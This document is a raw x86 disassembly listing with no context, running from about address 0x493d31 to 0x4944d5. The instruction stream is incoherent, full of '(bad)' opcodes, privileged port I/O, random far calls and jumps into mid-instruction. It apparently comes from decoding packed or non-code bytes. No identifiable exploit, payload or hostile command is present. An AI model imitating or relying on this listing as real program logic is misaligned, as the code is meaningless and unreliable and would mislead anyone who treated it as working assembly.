  493d31:	pop    ds
  493d32:	push   es
  493d33:	(bad)  
  493d34:	aas    
  493d35:	pop    ds
  493d36:	sbb    BYTE PTR cs:[esi+0x5f3fed6d],dh
  493d3d:	xchg   DWORD PTR [ecx-0x8638699],esp
  493d43:	add    bl,BYTE PTR [edi]
  493d45:	lock xor BYTE PTR [eax],dh
  493d48:	xor    DWORD PTR [edi+0x36],edx
  493d4b:	push   edi
  493d4c:	mov    dl,0x6
  493d4e:	pop    es
  493d4f:	std    
  493d50:	cmp    eax,0x80dd06
  493d55:	add    eax,0x9e1ed9a7
  493d5a:	mov    ebp,0x67c6cbc
  493d5f:	inc    ebx
  493d60:	add    BYTE PTR [esi-0x4a],ah
  493d63:	repz jl 0x493d04
  493d66:	jbe    0x493de6
  493d68:	jg     0x493d2a
  493d6a:	sbb    BYTE PTR [edi],0x8e
  493d6d:	in     eax,0x39
  493d6f:	clc    
  493d70:	inc    esp
  493d71:	add    BYTE PTR [eax+0x3e],bh
  493d74:	jo     0x493dd6
  493d76:	iret   
  493d77:	inc    eax
  493d78:	inc    esi
  493d79:	jle    0x493daa
  493d7b:	rol    BYTE PTR [edi],0x7
  493d7e:	inc    BYTE PTR [eax]
  493d80:	lock stc 
  493d82:	push   ds
  493d83:	sahf   
  493d84:	(bad)  
  493d86:	push   DWORD PTR [eax+0x30]
  493d89:	or     al,0x10
  493d8b:	push   es
  493d8c:	add    bh,bh
  493d8e:	lea    edi,[edi+eiz*8+0x3f1f0f39]
  493d95:	es jg  0x493d99
  493d98:	jecxz  0x493e13
  493d9a:	sahf   
  493d9b:	out    0x6,eax
  493d9d:	add    eax,DWORD PTR [edi]
  493d9f:	nop    DWORD PTR [edi]
  493da2:	xlat   BYTE PTR ds:[ebx]
  493da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  493da4:	or     cl,bh
  493da6:	into   
  493da7:	push   cs
  493da8:	add    BYTE PTR [ecx+esi*2],cl
  493dab:	add    eax,0xf7df079a
  493db0:	sahf   
  493db1:	or     BYTE PTR [eax],dl
  493db3:	mov    edx,0xe03dca20
  493db8:	daa    
  493db9:	add    ecx,edx
  493dbb:	add    bl,dh
  493dbd:	mov    ebp,0xf0276b7
  493dc2:	das    
  493dc3:	aas    
  493dc4:	dec    esi
  493dc5:	pop    edi
  493dc6:	push   0x1
  493dc8:	mov    gs,edi
  493dca:	outs   dx,BYTE PTR ds:[esi]
  493dcb:	daa    
  493dcc:	add    cl,bh
  493dce:	pop    es
  493dcf:	fwait
  493dd0:	int    0xe7
  493dd2:	mov    ecx,0x7ff0f8fd
  493dd7:	loopne 0x493e18
  493dd9:	rcr    BYTE PTR [edi],0x6f
  493ddc:	mov    ah,0x56
  493dde:	and    edi,eax
  493de0:	dec    edi
  493de1:	add    DWORD PTR [edi],eax
  493de3:	push   edi
  493de4:	xlat   BYTE PTR ds:[ebx]
  493de5:	mov    dh,0xee
  493de7:	ins    DWORD PTR es:[edi],dx
  493de8:	inc    edi
  493de9:	pop    edi
  493dea:	outs   dx,DWORD PTR ds:[esi]
  493deb:	clc    
  493dec:	pop    DWORD PTR [ecx]
  493dee:	adc    BYTE PTR [eax-0x72],cl
  493df1:	sbb    cl,BYTE PTR [eax+eiz*2+0x67]
  493df5:	add    bl,bl
  493df7:	arpl   WORD PTR [edi+0x7],cx
  493dfa:	add    esp,eax
  493dfc:	xlat   BYTE PTR ds:[ebx]
  493dfd:	pop    es
  493dfe:	sbb    ch,BYTE PTR [esi+eiz*1+0x35cfaa2a]
  493e05:	outs   dx,DWORD PTR ds:[esi]
  493e06:	ss dec edx
  493e08:	test   eax,0x180b88e
  493e0d:	inc    eax
  493e0e:	nop    DWORD PTR [ecx]
  493e11:	mov    esp,0x3f2e77b5
  493e16:	pop    edi
  493e17:	jg     0x493e20
  493e19:	pusha  
  493e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493e1b:	push   esp
  493e1c:	dec    ebx
  493e1d:	add    esi,edx
  493e1f:	pop    es
  493e20:	mov    bl,0xc1
  493e22:	data16 repz in al,0x13
  493e26:	les    edx,FWORD PTR [ecx]
  493e28:	test   BYTE PTR [eax],dl
  493e2a:	cmp    DWORD PTR [edi-0x2],0xffffffa5
  493e2e:	jbe    0x493e27
  493e30:	pop    esp
  493e31:	aas    
  493e32:	nop    DWORD PTR [esi]
  493e35:	adc    BYTE PTR ds:[si],cl
  493e39:	out    0x82,eax
  493e3b:	add    DWORD PTR [eax],eax
  493e3d:	addr16 inc ebp
  493e3f:	ss push edi
  493e41:	cmp    eax,DWORD PTR [edi]
  493e43:	cld    
  493e44:	pop    es
  493e45:	cmp    al,0x6
  493e47:	fsub   QWORD PTR [edx+0x29]
  493e4a:	mov    al,ds:0x7372e5a
  493e4f:	stos   BYTE PTR es:[edi],al
  493e50:	xor    eax,DWORD PTR [ecx]
  493e52:	xacquire lock add DWORD PTR [eax+0x37],esi
  493e57:	and    BYTE PTR [esi-0x30d15fad],cl
  493e5d:	ins    BYTE PTR es:[edi],dx
  493e5e:	js     0x493e25
  493e60:	xchg   ecx,eax
  493e61:	std    
  493e62:	or     al,0x38
  493e64:	jle    0x493e7e
  493e66:	or     al,0x7d
  493e68:	addr16 mov bl,0xd9
  493e6b:	cmp    BYTE PTR [esi],al
  493e6d:	sub    al,0x2
  493e6f:	inc    esi
  493e70:	add    ebp,esp
  493e72:	inc    ecx
  493e73:	sub    DWORD PTR [esi+esi*1-0x25],0xc14006b3
  493e7b:	popa   
  493e7c:	push   esi
  493e7d:	pusha  
  493e7e:	xor    DWORD PTR [eax],esp
  493e80:	sbb    dh,BYTE PTR [eax]
  493e82:	push   cs
  493e83:	dec    eax
  493e84:	inc    esp
  493e85:	cmc    
  493e86:	mov    cs,WORD PTR [esi]
  493e88:	sbb    BYTE PTR [edi+0x37],dh
  493e8b:	or     eax,0xf5eac0af
  493e90:	(bad)
  493e93:	jbe    0x493e18
  493e95:	fnstenv [esi]
  493e97:	cmp    al,0x9b
  493e99:	lock cmp eax,0x7c1848f8
  493ea0:	push   es
  493ea1:	sbb    al,0x3c
  493ea3:	stc    
  493ea4:	int    0x66
  493ea6:	mov    bl,0x1e
  493ea8:	sbb    al,0x1f
  493eaa:	or     al,0xf
  493eac:	test   BYTE PTR [edi-0x78000040],cl
  493eb2:	loopne 0x493eee
  493eb4:	cmp    esi,DWORD PTR fs:[eax-0x78821e3f]
  493ebb:	pop    edi
  493ebc:	adc    BYTE PTR [eax+0x36],al
  493ebf:	mov    esp,0xb01671b
  493ec4:	push   esi
  493ec5:	inc    eax
  493ec6:	add    al,0xf6
  493ec8:	aas    
  493ec9:	push   esp
  493eca:	cmp    eax,DWORD PTR [ecx]
  493ecc:	pop    es
  493ecd:	jnp    0x493f49
  493ecf:	jp     0x493ef0
  493ed1:	add    DWORD PTR [edx+0x9e8182],0xfffffff6
  493ed8:	idiv   bh
  493eda:	inc    DWORD PTR [edi-0x78515153]
  493ee0:	mov    al,ds:0xaa87a2a1
  493ee5:	lods   al,BYTE PTR ds:[esi]
  493ee6:	lods   al,BYTE PTR ds:[esi]
  493ee7:	xchg   DWORD PTR [edi-0x4d784e4f],ebp
  493eed:	mov    bl,0xb4
  493eef:	es scas eax,DWORD PTR es:[edi]
  493ef1:	mov    al,0x87
  493ef3:	mov    cl,0x10
  493ef5:	(bad)  
  493ef6:	ins    BYTE PTR es:[edi],dx
  493ef7:	fild   DWORD PTR ss:[edi-0x4078ff3e]
  493efe:	xchg   DWORD PTR [esi+0x7f131671],ebp
  493f04:	data16 mov bl,0x7d
  493f07:	pop    ds
  493f08:	call   0xb2ff:0x76a5999a
  493f0f:	add    bh,bh
  493f11:	jecxz  0x493f12
  493f13:	les    esp,FWORD PTR [edi+0x36]
  493f16:	fwait
  493f17:	int    0xff
  493f19:	sar    bh,cl
  493f1b:	(bad)  
  493f1d:	(bad)  
  493f1f:	fstp   DWORD PTR [edi]
  493f21:	shr    DWORD PTR [esi+esi*1-0x25],1
  493f25:	in     al,dx
  493f26:	add    bh,bh
  493f28:	in     al,0xff
  493f2a:	fdivp  st(7),st
  493f2c:	xchg   BYTE PTR [ebp+0x66],ah
  493f2f:	mov    bl,0x7d
  493f31:	addr16 push ebp
  493f33:	jg     0x493ed7
  493f35:	mov    eax,ds:0xa9b5a1
  493f3a:	jmp    DWORD PTR [esi+0x3667f8ff]
  493f40:	fwait
  493f41:	int    0xff
  493f43:	retf   
  493f44:	call   esi
  493f46:	jmp    ecx
  493f48:	jmp    esi
  493f4a:	packssdw mm3,mm7
  493f4d:	xor    eax,0xff0095db
  493f52:	mov    ds:0x8c27ceff,al
  493f57:	add    BYTE PTR [edi+0x7f],dh
  493f5a:	fnstcw WORD PTR [edx+0x6ea70db6]
  493f60:	mov    ch,0xb0
  493f62:	add    bh,bh
  493f64:	xchg   edx,esp
  493f66:	add    bh,bh
  493f68:	xlat   BYTE PTR ds:[ebx]
  493f69:	fwait
  493f6a:	int    0x66
  493f6c:	mov    bl,0xff
  493f6e:	(bad)  
  493f70:	icebp  
  493f71:	push   edi
  493f73:	push   esi
  493f75:	(bad)  
  493f76:	out    dx,al
  493f77:	xor    ebx,DWORD PTR [ebx-0x5e0cc13]
  493f7d:	add    bh,bh
  493f7f:	call   0xccc8cd83
  493f84:	data16 mov bl,0x1d
  493f87:	stos   DWORD PTR es:[edi],eax
  493f88:	add    BYTE PTR [ebp-0x52004c],dh
  493f8e:	int    0x59
  493f90:	and    DWORD PTR [edi+0xf],0x7
  493f94:	hlt    
  493f95:	add    bh,ch
  493f97:	ja     0x493f75
  493f99:	add    BYTE PTR [ebx+0x17f6cd99],al
  493f9f:	out    dx,eax
  493fa0:	add    bh,bh
  493fa2:	sti    
  493fa3:	(bad)  
  493fa4:	jmp    0x60c47c28
  493fa9:	mov    dh,0xb6
  493fab:	add    BYTE PTR [ebx+0xf2afc9],dh
  493fb1:	jg     0x493f4e
  493fb3:	int    0xd6
  493fb5:	cmp    eax,0xcf27ff56
  493fba:	add    bh,bh
  493fbc:	sar    edi,cl
  493fbe:	sar    bh,1
  493fc0:	retf   0x1783
  493fc3:	fidiv  DWORD PTR [ebx]
  493fc5:	aas    
  493fc6:	jg     0x493fae
  493fc8:	mov    bl,0x6f
  493fca:	(bad)  [edi+0xd]
  493fcd:	pop    edx
  493fce:	aad    0x0
  493fd0:	dec    DWORD PTR [edi-0x39a8ff19]
  493fd6:	add    bh,bh
  493fd8:	into   
  493fd9:	push   ds
  493fda:	lods   al,BYTE PTR ds:[esi]
  493fdb:	jnp    0x49400d
  493fdd:	ja     0x493fe6
  493fdf:	int3   
  493fe0:	add    BYTE PTR [edi-0x2f7424ca],bh
  493fe6:	jg     0x49402e
  493fe8:	mov    ch,0xbf
  493fea:	add    bh,bh
  493fec:	mov    ecx,0xeb3dafff
  493ff1:	jo     0x494053
  493ff3:	xchg   edi,ebp
  493ff5:	ret    
  493ff6:	add    BYTE PTR [edi-0x71],ah
  493ff9:	data16 ffreep st(0)
  493ffc:	test   DWORD PTR [esi],0x7f00d497
  494002:	mov    ch,0xb6
  494004:	pusha  
  494005:	das    
  494006:	lods   al,BYTE PTR ds:[esi]
  494007:	shl    DWORD PTR [edi+0xbc5fb5],0x87
  49400e:	mov    ch,0x0
  494010:	pusha  
  494011:	add    eax,0xa6d77707
  494016:	ja     0xe2217b88
  49401c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49401d:	(bad)  
  49401e:	jg     0x493fd8
  494020:	out    dx,al
  494021:	mov    ch,0xc5
  494023:	add    BYTE PTR [edi],cl
  494025:	data16 jmp 0x494018
  494028:	pop    edi
  494029:	(bad)
  49402d:	lock pop es
  49402f:	lds    eax,FWORD PTR [ebx+0xc7b07d]
  494035:	xchg   eax,esp
  494037:	add    BYTE PTR [edi-0x7c329849],cl
  49403d:	popf   
  49403e:	push   ds
  49403f:	jg     0x493ff8
  494041:	mov    eax,0xe25f00c8
  494046:	rcr    BYTE PTR [esi-0x28],0xb7
  49404a:	add    BYTE PTR [edi],cl
  49404c:	fadd   DWORD PTR [eax]
  49404e:	xlat   BYTE PTR ds:[ebx]
  49404f:	loop   0x494032
  494051:	xchg   esp,eax
  494052:	(bad)  
  494053:	ja     0x494053
  494055:	add    bh,bh
  494057:	push   cs
  494058:	mov    bh,0xd8
  49405a:	sbb    DWORD PTR [ebx],0xffffffda
  49405d:	push   ss
  49405e:	push   DWORD PTR [ebx+0xbadf7e]
  494064:	ins    BYTE PTR es:[edi],dx
  494065:	pusha  
  494066:	iret   
  494067:	jle    0x494068
  494069:	in     eax,dx
  49406a:	add    BYTE PTR [edi+0x7],bl
  49406d:	cld    
  49406e:	add    cl,bl
  494070:	push   cs
  494071:	push   cs
  494072:	sti    
  494073:	lahf   
  494074:	in     eax,0x0
  494076:	jg     0x494049
  494078:	add    BYTE PTR [ebx-0x73a2541e],ch
  49407e:	sahf   
  49407f:	das    
  494080:	inc    esi
  494081:	inc    edi
  494082:	pop    es
  494083:	shr    BYTE PTR [esi+esi*4+0x7],1
  494087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494088:	jmp    0x6b8a:0xffdfff00
  49408f:	pop    ss
  494090:	scas   eax,DWORD PTR es:[edi]
  494091:	fld    st(6)
  494093:	inc    DWORD PTR [eax]
  494095:	sub    eax,0xa5069dc5
  49409a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  49409c:	(bad)  
  49409d:	mov    ecx,0x7e606d1
  4940a2:	das    
  4940a3:	aas    
  4940a4:	les    eax,FWORD PTR [eax]
  4940a6:	pop    ss
  4940a7:	test   al,0x9a
  4940a9:	int    0xa5
  4940ab:	mov    bh,0x8d
  4940ad:	sub    DWORD PTR [ecx],ebx
  4940af:	pop    es
  4940b0:	xchg   edi,eax
  4940b1:	int    0xd2
  4940b3:	add    dh,BYTE PTR [ecx]
  4940b5:	pop    es
  4940b6:	outs   dx,DWORD PTR ds:[esi]
  4940b7:	or     BYTE PTR [edi],al
  4940b9:	scas   al,BYTE PTR es:[edi]
  4940ba:	inc    ecx
  4940bb:	add    DWORD PTR [eax+0x2f],0x104b05cf
  4940c2:	jb     0x494044
  4940c4:	adc    BYTE PTR [edi],al
  4940c6:	pop    ebx
  4940c7:	add    eax,0x75f087b
  4940cc:	out    dx,eax
  4940cd:	fsin   
  4940cf:	call   DWORD PTR [ebp+0x5]
  4940d2:	sub    BYTE PTR [esi],ah
  4940d4:	es adc eax,0x212b2c2f
  4940da:	sub    eax,0x3b232b2b
  4940df:	add    BYTE PTR [ecx],ah
  4940e1:	cmp    dh,bh
  4940e3:	(bad)  
  4940e4:	(bad)  
  4940e5:	mov    edi,0x37353123
  4940ea:	and    esi,DWORD PTR [ebx]
  4940ec:	aaa    
  4940ed:	cmp    DWORD PTR [ebx],esp
  4940ef:	xor    al,0x3a
  4940f1:	cmp    al,0x23
  4940f3:	ss cmp al,0x3e
  4940f6:	and    esi,DWORD PTR [edi]
  4940f8:	ds aas 
  4940fa:	and    edi,DWORD PTR [eax]
  4940fc:	aas    
  4940fd:	inc    eax
  4940fe:	and    edi,DWORD PTR [edx]
  494100:	push   es
  494101:	aaa    
  494102:	int    0xdd
  494104:	cld    
  494105:	cmp    eax,DWORD PTR [eax+0x41]
  494108:	and    edi,DWORD PTR [ecx]
  49410a:	aas    
  49410b:	cmp    BYTE PTR [esi],bh
  49410d:	inc    eax
  49410e:	das    
  49410f:	push   es
  494110:	cmp    eax,0x353c3c39
  494115:	fld    TBYTE PTR [esi+0x7b]
  494118:	ja     0x494121
  49411a:	xchg   DWORD PTR [ecx],esp
  49411c:	xor    al,BYTE PTR [eax]
  49411e:	and    DWORD PTR [ebx],eax
  494120:	adc    eax,0xe0557e6f
  494125:	(bad)  
  494126:	or     edx,DWORD PTR [edi+0x22]
  494129:	and    DWORD PTR [eax],esp
  49412b:	add    eax,0x8e8e8f71
  494130:	fild   QWORD PTR [esi+esi*1-0x25]
  494134:	fisttp WORD PTR [ebx-0x14751500]
  49413a:	shr    bl,1
  49413c:	aam    0xeb
  49413e:	test   eax,0xffebabaa
  494143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494144:	scas   eax,DWORD PTR es:[edi]
  494145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494146:	lods   al,BYTE PTR ds:[esi]
  494147:	jbe    0x494134
  494149:	push   ds
  49414a:	jmp    0x494172
  49414c:	mov    edx,0xbfbebdeb
  494151:	jmp    0x494112
  494153:	rcl    ebx,0x5c
  494156:	imul   edi,esi,0xffffffc1
  494159:	jmp    0x49411c
  49415b:	ret    0xebc3
  49415e:	ret    
  49415f:	jmp    0x49416d
  494161:	les    ebx,FWORD PTR [edi]
  494163:	cs mov edi,0x5aaebdf6
  494169:	mov    esp,0xeb96eb38
  49416e:	out    0x77,al
  494170:	rol    DWORD PTR [eax],cl
  494172:	push   0xebcd9b36
  494177:	shr    ebx,1
  494179:	into   
  49417a:	out    0xb0,eax
  49417c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49417d:	pop    ds
  49417e:	xor    DWORD PTR [esi-0x5],esp
  494181:	and    DWORD PTR [ecx],edi
  494183:	push   es
  494184:	or     eax,0x39767777
  494189:	popf   
  49418a:	add    cl,bh
  49418c:	pushf  
  49418d:	cmp    eax,0xffcc059d
  494192:	cdq    
  494193:	das    
  494194:	jbe    0x494175
  494196:	into   
  494197:	jmp    0xff00:0xbe075ac9
  49419e:	iret   
  49419f:	sahf   
  4941a0:	jnp    0x49414d
  4941a2:	add    eax,0xe696dfbe
  4941a7:	pop    es
  4941a8:	push   ss
  4941a9:	rol    DWORD PTR [edx],cl
  4941ab:	add    edi,DWORD PTR [edi+ebx*2-0xb20b162]
  4941b2:	add    BYTE PTR ds:0x2700ebec,0x36
  4941b9:	nop
  4941ba:	pop    esp
  4941bb:	mov    ah,0xef
  4941bd:	mov    dh,0x4f
  4941bf:	xchg   esp,eax
  4941c0:	add    BYTE PTR [ecx-0xa4ce2e2],dl
  4941c6:	cmp    ch,0x8e
  4941c9:	lea    ecx,[ebx+0x1700a367]
  4941cf:	mov    eax,ds:0xd79dff00
  4941d4:	xlat   BYTE PTR ds:[ebx]
  4941d5:	add    ah,BYTE PTR [esi-0x1]
  4941d8:	ror    esi,0xc7
  4941db:	push   es
  4941dc:	ja     0x49419e
  4941de:	xlat   BYTE PTR ds:[ebx]
  4941df:	mov    ebp,0xe87bef7
  4941e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4941e5:	js     0x4941de
  4941e7:	push   esi
  4941e8:	pop    edi
  4941e9:	mov    BYTE PTR [bx-0x42],0xf7
  4941ee:	push   ss
  4941ef:	js     0x494174
  4941f1:	aaa    
  4941f2:	pop    esi
  4941f3:	div    DWORD PTR [esi-0x1]
  4941f6:	jle    0x49426f
  4941f8:	add    BYTE PTR [ebx],0xbc
  4941fb:	push   es
  4941fc:	dec    edi
  4941fd:	push   es
  4941fe:	mov    ebp,0x407ed9fe
  494203:	sahf   
  494204:	sub    DWORD PTR ds:0x698e9091,eax
  49420a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49420b:	add    bh,bh
  49420d:	test   al,0xb3
  49420f:	xor    eax,0x175f8230
  494214:	stos   DWORD PTR es:[edi],eax
  494215:	add    bh,bh
  494217:	std    
  494218:	jo     0x4941da
  49421a:	add    ah,BYTE PTR [esi-0x1]
  49421d:	cmc    
  49421e:	data16 (bad) 
  494220:	cmp    eax,eax
  494222:	lea    esi,[eax-0x11]
  494225:	push   es
  494226:	fimul  WORD PTR [edi+0x603838ae]
  49422c:	sub    DWORD PTR [esi+0x1edff76],0xc77e060c
  494236:	xlat   BYTE PTR ds:[ebx]
  494237:	xchg   esi,eax
  494238:	add    bh,bh
  49423a:	(bad)  [esi]
  49423c:	or     ebx,DWORD PTR [eax-0x40807e]
  494242:	mov    edi,0x3cf203e0
  494247:	sub    eax,0x90929407
  49424c:	imul   edi,DWORD PTR [eax],0xbe3b9c1c
  494252:	out    0x6,eax
  494254:	femms  
  494256:	add    BYTE PTR ds:0x75e160e,0x56
  49425d:	push   DWORD PTR [edi-0x103f93e3]
  494263:	out    dx,eax
  494264:	inc    DWORD PTR [edi]
  494266:	add    esi,DWORD PTR [ebx-0x4ee84527]
  49426c:	add    bh,bh
  49426e:	cmp    edi,0x13bc8f9f
  494274:	out    dx,al
  494275:	test   BYTE PTR [esi+0x2d674e06],ch
  49427b:	cmp    BYTE PTR [eax+0x2a],ah
  49427e:	(bad)  
  49427f:	call   DWORD PTR [ebp+0x3ac6900]
  494285:	imul   esi,eax,0xffffff9c
  494288:	add    BYTE PTR [edi],bh
  49428a:	pop    es
  49428b:	pop    es
  49428c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49428d:	add    BYTE PTR [edi-0x459fc374],ah
  494293:	add    ebp,ebx
  494295:	inc    edi
  494296:	es test cl,al
  494299:	rcr    DWORD PTR [ebp-0x29],0x96
  49429d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49429e:	fsubr  DWORD PTR ds:[esi]
  4942a1:	ss loopne 0x4942a2
  4942a4:	xchg   edi,edx
  4942a6:	pop    es
  4942a7:	mov    eax,DWORD PTR ds:0x76371606
  4942ad:	mov    dh,0x17
  4942af:	or     BYTE PTR [edi],bh
  4942b1:	bound  ecx,QWORD PTR [ebx-0x696800aa]
  4942b7:	xchg   esp,eax
  4942b8:	imul   ebx,DWORD PTR [edx+0x3c],0x7fc6c19c
  4942bf:	push   es
  4942c0:	jg     0x4942e1
  4942c2:	mov    eax,0xcf062ee1
  4942c7:	add    BYTE PTR [edi+0x17f6077e],cl
  4942cd:	data16 or BYTE PTR [ebp+0x5ffc0127],0xe0
  4942d5:	(bad)  
  4942d6:	in     al,dx
  4942d7:	or     DWORD PTR [esi],edx
  4942d9:	stc    
  4942da:	add    bh,bh
  4942dc:	jg     0x4942e6
  4942de:	out    dx,al
  4942df:	inc    edi
  4942e0:	in     al,dx
  4942e1:	pop    esi
  4942e2:	call   FWORD PTR [ecx-0x10966868]
  4942e8:	in     al,0xb0
  4942ea:	or     ebp,ebp
  4942ec:	into   
  4942ed:	mov    bl,0x0
  4942ef:	(bad)  
  4942f0:	out    dx,eax
  4942f1:	pop    es
  4942f2:	popa   
  4942f3:	jnp    0x49436d
  4942f5:	popa   
  4942f6:	push   es
  4942f7:	ds (bad) 
  4942f9:	out    dx,eax
  4942fa:	jno    0x49436c
  4942fc:	cmp    BYTE PTR [eax-0x22],bh
  4942ff:	(bad)  
  494301:	scas   eax,DWORD PTR es:[edi]
  494302:	mov    esi,eax
  494304:	out    dx,al
  494305:	jecxz  0x49431d
  494307:	pop    es
  494308:	into   
  494309:	fbstp  TBYTE PTR [edi]
  49430b:	out    dx,al
  49430c:	add    ebp,ebp
  49430e:	ins    DWORD PTR es:[edi],dx
  49430f:	call   DWORD PTR [edi-0x1]
  494312:	fwait
  494313:	call   0xbc2b:0x1eee6998
  49431a:	adc    eax,0x1f5e0746
  49431f:	rcr    ebx,1
  494321:	push   ds
  494322:	push   es
  494323:	push   es
  494324:	ja     0x494327
  494326:	xchg   edi,eax
  494327:	lahf   
  494328:	push   edi
  494329:	(bad)  
  49432a:	mov    ds:0x2e1f9e95,eax
  49432f:	pop    ds
  494330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494331:	jae    0x4942fa
  494333:	push   ss
  494334:	dec    esi
  494335:	push   es
  494336:	pop    ds
  494337:	push   es
  494338:	pminub mm1,QWORD PTR [edi-0xe174a0]
  49433f:	popf   
  494340:	pushf  
  494341:	call   0x15bb:0xedb6ec69
  494348:	push   ds
  494349:	fist   WORD PTR [esi+0xe]
  49434c:	mov    edi,0x15ff00f3
  494351:	scas   al,BYTE PTR es:[edi]
  494352:	int3   
  494353:	and    ah,dh
  494355:	setle  bh
  494358:	rcl    DWORD PTR [eax],0xa7
  49435b:	mov    BYTE PTR [esi],0xf
  49435e:	mov    es:0x2fa3b83b,eax
  494364:	(bad)  
  494365:	pop    ss
  494366:	es push edi
  494368:	sbb    BYTE PTR [ebp+0x6746bbc5],dh
  49436e:	push   cs
  49436f:	push   DWORD PTR [eax+0x70]
  494372:	das    
  494373:	sub    al,0xcc
  494375:	test   al,0x69
  494377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494378:	(bad)  
  494379:	xchg   esi,eax
  49437a:	(bad)  
  49437b:	dec    esi
  49437c:	stos   DWORD PTR es:[edi],eax
  49437d:	lock out 0xb7,eax
  494380:	fimul  WORD PTR [edi-0xe189740]
  494386:	add    BYTE PTR gs:[edi],ch
  494389:	pop    ss
  49438a:	(bad)  
  49438b:	(bad)  
  49438c:	cmp    bl,BYTE PTR [edx]
  49438e:	sbb    al,0xdc
  494390:	push   cs
  494391:	push   DWORD PTR [esi]
  494393:	pop    edi
  494394:	cmp    eax,eax
  494396:	add    BYTE PTR [esi],dh
  494398:	push   cs
  494399:	(bad)  
  49439a:	mov    esi,0x58bd5767
  49439f:	in     al,dx
  4943a0:	test   BYTE PTR [edi-0x78424822],dl
  4943a6:	adc    edi,0x77170095
  4943ac:	push   ds
  4943ad:	daa    
  4943ae:	mov    ?,WORD PTR [eax]
  4943b0:	loopne 0x49433a
  4943b2:	push   ds
  4943b3:	push   ss
  4943b4:	xchg   BYTE PTR [edx+0x77],bh
  4943b7:	mov    al,0x2a
  4943b9:	pop    es
  4943ba:	pop    ds
  4943bb:	cs aas 
  4943bd:	push   esi
  4943be:	std    
  4943bf:	add    dh,dh
  4943c1:	pop    esi
  4943c2:	jmp    DWORD PTR [edi-0x40965557]
  4943c8:	ret    
  4943c9:	call   0x1ec13436
  4943ce:	pop    ss
  4943cf:	(bad)  
  4943d2:	ffree  st(3)
  4943d4:	push   cs
  4943d5:	out    0x1,eax
  4943d7:	loope  0x494400
  4943d9:	je     0x49438b
  4943db:	stos   BYTE PTR es:[edi],al
  4943dc:	mov    al,0xf
  4943de:	pop    es
  4943df:	pop    es
  4943e0:	inc    esi
  4943e1:	jl     0x49438d
  4943e3:	jecxz  0x494403
  4943e5:	call   FWORD PTR [edi-0x3944965f]
  4943eb:	mov    edx,0xee77db32
  4943f0:	pop    es
  4943f1:	mov    ebx,0x17b6ff00
  4943f6:	lds    edi,FWORD PTR [ecx+0x1c]
  4943f9:	in     al,dx
  4943fa:	das    
  4943fb:	(bad)  
  4943fc:	pop    ds
  4943fd:	inc    BYTE PTR [edi]
  4943ff:	(bad)  
  494400:	leave  
  494401:	pusha  
  494402:	add    al,0x47
  494404:	outs   dx,BYTE PTR ds:[esi]
  494405:	(bad)  
  494406:	cmp    BYTE PTR [ecx+esi*8+0x69a2a054],cl
  49440d:	dec    esi
  49440e:	mov    dh,0xaf
  494410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  494411:	xchg   ecx,eax
  494412:	mov    ebx,0xf0617c7
  494417:	push   ss
  494418:	xor    DWORD PTR [esi-0x41f8e8b2],ecx
  49441e:	lahf   
  49441f:	es stos DWORD PTR es:[edi],eax
  494421:	jo     0x4943a4
  494423:	mov    al,BYTE PTR [edi]
  494425:	inc    DWORD PTR [edi]
  494427:	pminub mm0,QWORD PTR [eax]
  49442a:	dec    edi
  49442b:	pop    ss
  49442c:	call   FWORD PTR ds:[esi+0x3bc38a2]
  494433:	shl    DWORD PTR [ebx+0x7afec69],0x6
  49443a:	out    dx,al
  49443b:	jmp    0xf66:0x76e162e
  494442:	lahf   
  494443:	shl    DWORD PTR [eax],1
  494445:	mov    dh,BYTE PTR [ebx+0x1]
  494448:	sahf   
  494449:	pop    es
  49444a:	push   cs
  49444b:	addr16 lock mov ds:0xffae,eax
  494450:	mov    al,ds:0xa769a5a3
  494455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  494456:	jecxz  0x49448d
  494458:	xchg   BYTE PTR [ebx+0x7],bh
  49445b:	pop    ss
  49445c:	out    0x16,al
  49445e:	test   BYTE PTR [ebx+0x1e07e05b],al
  494464:	push   ss
  494465:	dec    DWORD PTR [edx-0x499d3e2d]
  49446b:	ds dec edi
  49446d:	popw   es
  49446f:	ins    DWORD PTR es:[edi],dx
  494470:	hlt    
  494471:	jo     0x4943f6
  494473:	ss pop edi
  494475:	mov    dh,0xff
  494477:	mov    edi,DWORD PTR [ebx-0x19]
  49447a:	inc    esi
  49447b:	lahf   
  49447c:	push   esi
  49447d:	pop    es
  49447e:	push   ss
  49447f:	pop    es
  494480:	jmp    0x7d7f575
  494485:	pop    es
  494486:	mov    fs,WORD PTR [eax+0x3fe0dee2]
  49448c:	ds pop es
  49448e:	push   esi
  49448f:	pop    es
  494490:	push   0x37c39c0b
  494495:	inc    esi
  494496:	outs   dx,BYTE PTR ds:[esi]
  494497:	jmp    ecx
  494499:	ds inc esi
  49449b:	aas    
  49449c:	lahf   
  49449d:	mov    ds:0xa7c669a4,al
  4944a2:	push   es
  4944a3:	jno    0x494465
  4944a5:	(bad)  
  4944a6:	loope  0x4944af
  4944a8:	mov    BYTE PTR [edi],0x2e
  4944ab:	mov    eax,0x7d85677
  4944b0:	test   DWORD PTR [eax],0x61163edf
  4944b6:	test   BYTE PTR [ebp+0x2f],bl
  4944b9:	ds pop ds
  4944bb:	(bad)  [eax-0x1b8f1e9]
  4944c1:	neg    DWORD PTR [edi-0x7c715cc0]
  4944c7:	dec    esi
  4944c8:	jmp    FWORD PTR [ebp-0x504e9f1d]
  4944ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4944cf:	addr16 pop es
  4944d1:	cmc    
  4944d2:	jp     0x4944d7
  4944d4:	pop    es
  4944d5:	(bad)  
